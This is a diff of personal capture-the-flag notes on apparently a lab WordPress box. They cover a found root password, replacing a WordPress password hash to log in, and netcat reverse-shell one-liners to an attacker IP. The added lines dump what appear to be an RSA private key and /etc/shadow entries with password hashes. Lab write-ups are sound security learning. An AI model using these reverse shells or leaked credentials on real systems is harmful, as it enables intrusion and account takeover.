@@ -80,8 +80,12 @@ PORT      STATE  SERVICE
 * Also found multiple vulnerabilities with the xmlrpc.php page but they're kind of irrelevant bacause it's either a DDoS attack or a Brute Force and I want to keep brute forcing as my last resort.
 * Also, tried with the ftp but even if I was able to transfer files through it I don't think I can access files I transfered through the webpage.
 
-* Found this username and password in the "Cute File Browser" that I got access to through the directory `plugins`
+* Found this username and password in the "Cute File Browser" that I got access to through the directory `plugins`  
 root   8YsqfCTnvxAUeduzjNSXe22
+
+
+/etc/php/7.0/mods-available/ftp.ini
+/usr/share/php7.0-common/common/ftp.ini
 
 
 * Hash cracker  
@@ -90,8 +94,9 @@ root   8YsqfCTnvxAUeduzjNSXe22
 * So instead of trying to crack the hash an idea occured to me to change the whole hash into one that I know what it is and I found <a href="https://www.useotools.com/wordpress-password-hash-generator">this</a> which generates wordpress hashes that are hashed with Portable PHP password hashing framework and with that I got into the WordPress.
 
 
- exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 1234 >/tmp/f");
+ exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.46  1234 >/tmp/f");
 
+sudo rm /tmp/f;mkfifo /tmp/f; sudo cat /tmp/f|/bin/sh -i 2>&1| sudo nc 10.10.14.46  1234 >/tmp/f
 
  /etc/init.d/pro restart
 
@@ -149,7 +154,8 @@ define('DB_USER', 'wordpress');
    
 
 ## Where I Got Stuck?   
-  
+
+* I HAD THE PASSWORD ALL ALONG!!
 
 ## What Did I learn from this Machine?  
 
@@ -161,5 +167,50 @@ nc -z -v localhost 20-80 2>&1 | grep succeeded
 
 
 
+private.key rsa
+
+IIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCdud3PmuhCGcNFs7XEcA9+Xw9O9fuRW3gadiat+4vn3bizihuy/ZsI8ZBsM5Ngw+hK/U6kho//fo0fzj2qn4BqVBAzdDShTu8Qnmo/lyjrTcAfGXbakPblNs0YhG0JpydtGbA+q3jckqHO7hlF/DvXROOdfxlaZM93Dvj1xcz1o21AzoR64fGqbHSF2hH3TH2nJ74HmTNv597Vgpy7XbcPrGl+PoMc0h1MgV+KR3uQiAPg67gCZ4u3xHpa6cg/18XIfijX5FLj9wsuQDgfuSKd2EheEVHBTKIKPnDc+Yb/8D/L6tCEUnM0YTALXiSdwrSHLvy4b77z7l8W8N5Wc3N5AgMBAAECggEAahJXc4iv7dQ5mKSU9ziNkuUG/Ik817J2AQW4WYUzv4lC76tPmX4oR0l9YOcGlCrsC5Jy0v6T1LUc32jp29dMmzVRd+kMg/b7m2eN+JoFsMknDUMoxTB8egXyxCw60CUTxLFj76GNtHkATJOfd4t8CvePQ5n4SOxHAcCV+WM+xWpDaAJuPBT2ffdw1gnNnFaEp7ryRowNvXCDR49Z2CORiEeX/ICdiKVcDH5Vtl49n2wJk2qv/HJpFZvwVOTCneDeCcEBoXeOojEaDggbsxPjFPfMG8Zo4bOjAu869Afc+b5Ixrcy5ktJUZqdGT+xoHuUsYs2/FWReN0yYJ73ipvYCQKBgQDp49n7jZuuKv6k86m936/44xARZlTagOQmyqsfxmaFZ97Pr8fJrMufv5RN/eHEIcOaZfNwII7fyeDOAjp+HOX0OueR/3AI+Zr15SEL713BEnbytlZCoH0ebvoCNlUgk8L54WsdoQqPu/wLGTZfcFdSkMRUHP1/LQdj+/efq84WvwKBgQCsotfOFyhkumV3HKhbBtMH1lJT4V3hJ87G4GnXITG7qgzdT7KNAe1wxdilHOY4z61A/7a7Ao6a/ecrlKfzWufl9dHoiESc2XVw9YO3wheqZnTy+/8DgrzIm221HH16VgobIBxRrmBv6ZzyjYyNfzfX9bJppYnAR5/a/1090i57xwKBgAwFEabD2ERTIVMI0qhXXovD34eFYsb36MG1mKXBZHNmqySxO+s5Xh2PkuePLJMPySWeJ6yTf8Qwc8UiiC8C/S5X+J6gKfnMGhKY++HJI2BQupwukrBJ3yQ5P8/tSuKptVNyKjcTl59bYdCQMyMkethbaDuKYdyvS7nvsQIbqjOxAoGBAJdhhFNXwzfwqyCzpH2NkmeA7FhZevUA7zU9fBIFLZMeHoHCbRNw6UDGfJ7spISUt5wTn6yFJX+LvbZdeJjQ0iC4WgTJ2UCg/3a6E3KDZDUr+slHZ+swLVLL2HvEK9Omtt3qXmrRugbol5Opw+If+FwLOxOg8RYGuIpU+vJG6DPpAoGBANSVjA1DF6NJWuMdi6uWuQr0iEvNPAm7V7MJ+LcvlzRn2N1VRL4iAEV4Ijk7yVNx7xtAbPcs5WH8iGP8gNDDUUnv30hgHY+J9H8wfCtIpzvoBMiw5Gt1kWyK4e4hKdFnNxaXt4p/5sNeA4PM8EeEwL/rKNxzVXjicQqRE3YZZSiB  
 
 
+
+public.key   
+
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnbndz5roQhnDRbO1xHAPfl8PTvX7kVt4GnYmrfuL5924s4obsv2bCPGQbDOTYMPoSv1OpIaP/36NH849qp+AalQQM3Q0oU7vEJ5qP5co603AHxl22pD25TbNGIRtCacnbRmwPqt43JKhzu4ZRfw710TjnX8ZWmTPdw749cXM9aNtQM6EeuHxqmx0hdoR90x9pye+B5kzb+fe1YKcu123D6xpfj6DHNIdTIFfikd7kIgD4Ou4AmeLt8R6WunIP9fFyH4o1+RS4/cLLkA4H7kindhIXhFRwUyiCj5w3PmG//A/y+rQhFJzNGEwC14kncK0hy78uG++8+5fFvDeVnNzeQIDAQAB   
+
+
+
+$6$xyz$WwFC0nTow5jwJwMYeOZItipYgZidye/O7Z2kxRP3cPttku.GHre0y/51bO2uJlRjQwLNRddSA5fuJG5X1F8Dd1
+
+root:$6$xyz$WwFC0nTow5jwJwMYeOZItipYgZidye/O7Z2kxRP3cPttku.GHre0y/51bO2uJlRjQwLNRddSA5fuJG5X1F8Dd1:18410:0:99999:7:::
+daemon:*:17212:0:99999:7:::
+bin:*:17212:0:99999:7:::
+sys:*:17212:0:99999:7:::
+sync:*:17212:0:99999:7:::
+games:*:17212:0:99999:7:::
+man:*:17212:0:99999:7:::
+lp:*:17212:0:99999:7:::
+mail:*:17212:0:99999:7:::
+news:*:17212:0:99999:7:::
+uucp:*:17212:0:99999:7:::
+proxy:*:17212:0:99999:7:::
+www-data:*:17212:0:99999:7:::
+backup:*:17212:0:99999:7:::
+list:*:17212:0:99999:7:::
+irc:*:17212:0:99999:7:::
+gnats:*:17212:0:99999:7:::
+nobody:*:17212:0:99999:7:::
+systemd-timesync:*:17212:0:99999:7:::
+systemd-network:*:17212:0:99999:7:::
+systemd-resolve:*:17212:0:99999:7:::
+systemd-bus-proxy:*:17212:0:99999:7:::
+syslog:*:17212:0:99999:7:::
+_apt:*:17212:0:99999:7:::
+lxd:*:17349:0:99999:7:::
+messagebus:*:17349:0:99999:7:::
+uuidd:*:17349:0:99999:7:::
+dnsmasq:*:17349:0:99999:7:::
+notch:$6$RdxVAN/.$DFugS5p/G9hTNY9htDWVGKte9n9r/nYYL.wVdAHfiHpnyN9dNftf5Nt.DkjrUs0PlYNcYZWhh0Vhl/5tl8WBG1:17349:0:99999:7:::
+mysql:!:17349:0:99999:7:::
+proftpd:!:17349:0:99999:7:::
+ftp:*:17349:0:99999:7:::
+sshd:*:17349:0:99999:7:::
